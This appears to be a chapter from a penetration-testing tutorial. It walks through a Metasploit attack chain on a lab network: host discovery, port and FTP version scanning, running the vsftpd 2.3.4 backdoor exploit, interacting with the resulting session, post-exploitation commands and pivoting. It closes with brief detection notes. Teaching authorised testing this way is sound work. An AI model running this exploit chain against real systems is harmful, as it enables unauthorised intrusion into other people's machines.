# Chapter 8: Real-World Attack Chains

## 8.1 Overview

In real penetration testing, attacks are rarely isolated actions. Instead, they are part of a **chain of steps** that move from initial reconnaissance to full system compromise.

This chapter brings together everything learned so far and demonstrates how Metasploit is used in a complete attack workflow.

---

## 8.2 What is an Attack Chain?

An attack chain is a sequence of actions that typically includes:

1. Reconnaissance  
2. Service enumeration  
3. Vulnerability identification  
4. Exploitation  
5. Session establishment  
6. Post-exploitation  
7. Lateral movement (optional)  

Each step builds on the previous one.

---

## 8.3 Example Scenario: Internal Network Target

Assume a penetration tester is given access to a lab network:

- Network range: 192.168.1.0/24  
- Goal: Identify vulnerable services and gain access to at least one host  

---

## 8.4 Step 1: Reconnaissance

First, identify live hosts.

```bash
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run
````

Result: Active hosts are discovered.

---

## 8.5 Step 2: Port Scanning

Next, identify open ports on a target system.

```bash id="atk2a1"
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-1000
run
```

Expected output may reveal services like:

* FTP (21)
* SSH (22)
* HTTP (80)

---

## 8.6 Step 3: Service Enumeration

Identify service versions for vulnerability matching.

```bash id="atk3a1"
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.10
run
```

Example result:

* FTP service version detected

---

## 8.7 Step 4: Exploit Selection

Search for a relevant exploit.

```bash id="atk4a1"
search vsftpd
```

Select exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

## 8.8 Step 5: Configuration

Set required parameters:

```bash id="atk5a1"
set RHOSTS 192.168.1.10
set RPORT 21
set payload cmd/unix/interact
```

---

## 8.9 Step 6: Exploitation

Execute the exploit:

```bash id="atk6a1"
exploit
```

If successful, a session is created.

---

## 8.10 Step 7: Session Verification

Check active sessions:

```bash id="atk7a1"
sessions
```

Interact with session:

```bash
sessions -i 1
```

---

## 8.11 Step 8: Post-Exploitation

Once inside the system, gather information:

```bash id="atk8a1"
sysinfo
getuid
```

Explore file system:

```bash
ls
pwd
```

---

## 8.12 Step 9: Privilege Assessment

Check current privilege level:

```bash id="atk9a1"
getuid
```

If privileges are low, attempt escalation using available modules.

---

## 8.13 Step 10: Internal Expansion (Conceptual Pivoting)

If the compromised system is inside a network, it may be used as a pivot point.

Typical steps:

* Identify internal IP ranges
* Scan internal systems
* Attempt additional exploitation

```bash id="atk10a1"
ipconfig
route
```

---

## 8.14 Full Attack Chain Summary

A complete Metasploit attack chain looks like this:

| Phase             | Action            |
| ----------------- | ----------------- |
| Reconnaissance    | Identify hosts    |
| Scanning          | Detect open ports |
| Enumeration       | Identify services |
| Exploitation      | Run exploit       |
| Access            | Establish session |
| Post-Exploitation | Gather data       |
| Expansion         | Pivot or escalate |

---

## 8.15 Defensive Perspective

From a security standpoint, attack chains can be detected through:

* Sequential port scanning patterns
* Multiple service probes
* Unusual login activity
* Reverse shell connections
* Lateral movement attempts

Security tools aim to break the chain early, ideally during reconnaissance.

---

## 8.16 Common Mistakes in Real Engagements

* Skipping enumeration and guessing exploits
* Not validating service versions
* Ignoring post-exploitation opportunities
* Failing to document steps

A structured approach is essential for success.

---

## 8.17 Best Practices

* Always follow a systematic workflow
* Validate each step before proceeding
* Use database tracking in Metasploit
* Keep detailed notes of each phase

---

## 8.18 What’s Next?

In the next chapter, we will cover:

* Defensive analysis of Metasploit attacks
* Detection techniques used by SOC teams
* How blue teams respond to exploitation activity

---

## Summary

Real-world penetration testing is not about isolated commands—it is about chaining reconnaissance, exploitation, and post-exploitation into a structured workflow. Metasploit provides the tools to execute and manage this entire process efficiently.
